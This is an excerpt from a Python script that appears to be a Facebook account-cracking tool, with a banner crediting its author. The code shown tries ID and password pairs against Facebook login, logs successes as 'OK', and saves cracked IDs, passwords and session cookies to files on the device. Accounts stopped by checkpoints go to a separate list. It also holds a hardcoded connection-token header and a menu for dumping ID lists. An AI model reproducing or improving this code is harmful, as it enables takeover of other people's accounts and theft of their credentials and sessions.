...
░╚════╝░░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            AHSAN 
\033[1;37m Facebook:          Ahsan Ali
\033[1;37m Github  :            Ahsanjungli244
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back AJD Menu ")
        exit()
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Ahsan-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ahsan_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Ahsan-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Ahsan_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/AJD .txt') 
        print(47*"-")
